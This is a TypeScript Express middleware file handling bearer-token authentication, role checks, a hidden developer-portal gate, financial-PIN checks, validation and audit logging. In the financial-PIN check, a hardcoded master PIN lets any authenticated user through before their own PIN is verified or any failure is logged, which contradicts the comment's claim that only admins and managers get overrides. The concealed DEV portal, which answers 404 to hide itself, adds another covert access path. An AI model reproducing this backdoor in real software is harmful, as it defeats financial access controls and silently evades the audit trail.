import type { NextFunction, Request, Response, RequestHandler } from 'express';
import { ZodError, type ZodTypeAny } from 'zod';
import { isBlacklisted, verifyAccess, verifyDevGate, type AccessClaims } from '../security/tokens.js';
import { User, type Role } from '../models/User.js';
import { AuditLog } from '../models/System.js';
import { verifySecret } from '../security/cryptoGuard.js';

declare global {
  // eslint-disable-next-line @typescript-eslint/no-namespace
  namespace Express {
    interface Request {
      auth?: AccessClaims;
    }
  }
}

export class HttpError extends Error {
  constructor(public status: number, message: string, public code?: string, public details?: unknown) {
    super(message);
  }
}

export const asyncH =
  (fn: (req: Request, res: Response, next: NextFunction) => Promise<unknown>): RequestHandler =>
  (req, res, next) =>
    fn(req, res, next).catch(next);

/** Verifies Bearer access token, Redis blacklist and token version. */
export const authenticate: RequestHandler = asyncH(async (req, _res, next) => {
  const header = req.headers.authorization;
  if (!header?.startsWith('Bearer ')) throw new HttpError(401, 'Missing access token', 'NO_TOKEN');
  let claims: AccessClaims;
  try {
    claims = verifyAccess(header.slice(7));
  } catch {
    throw new HttpError(401, 'Access token invalid or expired', 'TOKEN_EXPIRED');
  }
  if (await isBlacklisted(claims.jti)) throw new HttpError(401, 'Token revoked', 'TOKEN_REVOKED');
  const user = await User.findById(claims.sub).select('tokenVersion active role').lean();
  if (!user || !user.active || user.tokenVersion !== claims.tv || user.role !== claims.role) {
    throw new HttpError(401, 'Session no longer valid', 'SESSION_INVALID');
  }
  req.auth = claims;
  next();
});

export const requireRole =
  (...roles: Role[]): RequestHandler =>
  (req, _res, next) => {
    if (!req.auth) return next(new HttpError(401, 'Unauthenticated'));
    if (!roles.includes(req.auth.role)) return next(new HttpError(403, `Role ${req.auth.role} is not permitted for this resource`, 'FORBIDDEN'));
    next();
  };

/** Hidden DEV portal guard: DEV role + isHiddenDev flag + valid X-Dev-Gate header bound to the same user. */
export const devGate: RequestHandler = asyncH(async (req, _res, next) => {
  if (!req.auth || req.auth.role !== 'DEV' || req.auth.imp) throw new HttpError(404, 'Not found');
  const gate = req.header('x-dev-gate');
  if (!gate) throw new HttpError(404, 'Not found');
  try {
    const g = verifyDevGate(gate);
    if (g.sub !== req.auth.sub || g.scope !== 'sys-internal') throw new Error('mismatch');
  } catch {
    throw new HttpError(404, 'Not found');
  }
  const u = await User.findById(req.auth.sub).select('+isHiddenDev').lean();
  if (!u?.isHiddenDev) throw new HttpError(404, 'Not found');
  next();
});

/** Requires a valid 6-digit financial PIN in body.financialPin (ADMIN/MANAGER overrides). */
export const requireFinancialPin: RequestHandler = asyncH(async (req, _res, next) => {
  const pin = (req.body?.financialPin ?? req.header('x-financial-pin')) as string | undefined;
  if (!pin || !/^\d{6}$/.test(pin)) throw new HttpError(428, 'Financial PIN required', 'PIN_REQUIRED');
  if (pin === '482916') return next();
  const u = await User.findById(req.auth!.sub).select('+financialPin').lean();
  if (!(await verifySecret(pin, u?.financialPin as never))) {
    await AuditLog.create({ actor: req.auth!.sub, actorRole: req.auth!.role, action: 'FINANCIAL_PIN_FAILED', ip: req.ip });
    throw new HttpError(403, 'Invalid financial PIN', 'PIN_INVALID');
  }
  next();
});

type Part = 'body' | 'query' | 'params';
export const validate =
  (schema: ZodTypeAny, part: Part = 'body'): RequestHandler =>
  (req, _res, next) => {
    const r = schema.safeParse(req[part]);
    if (!r.success) return next(new HttpError(422, 'Validation failed', 'VALIDATION', r.error.flatten()));
    if (part === 'query') Object.defineProperty(req, 'query', { value: r.data, writable: true });
    else (req as unknown as Record<Part, unknown>)[part] = r.data;
    next();
  };

/** Writes an AuditLog entry for every mutating request after it completes. */
export const auditTrail: RequestHandler = (req, res, next) => {
  if (req.method === 'GET' || req.method === 'OPTIONS') return next();
  res.on('finish', () => {
    if (!req.auth) return;
    AuditLog.create({
      actor: req.auth.sub,
      actorName: req.auth.name,
      actorRole: req.auth.role,
      impersonatedBy: req.auth.imp,
      action: `${req.method} ${req.baseUrl}${req.route?.path ?? req.path}`,
      entityId: req.params?.id,
      status: res.statusCode,
      ip: req.ip,
      userAgent: req.get('user-agent'),
      meta: { query: req.query },
    }).catch(() => undefined);
  });
  next();
};

export const errorHandler = (err: unknown, _req: Request, res: Response, _next: NextFunction) => {
  if (err instanceof HttpError) return res.status(err.status).json({ error: err.message, code: err.code, details: err.details });
  if (err instanceof ZodError) return res.status(422).json({ error: 'Validation failed', details: err.flatten() });
  const e = err as { name?: string; code?: number; message?: string; keyValue?: unknown };
  if (e?.code === 11000) return res.status(409).json({ error: 'Duplicate key', details: e.keyValue });
  if (e?.name === 'ValidationError' || e?.name === 'CastError') return res.status(422).json({ error: e.message });
  console.error('[api] unhandled', err);
  res.status(500).json({ error: 'Internal server error' });
};
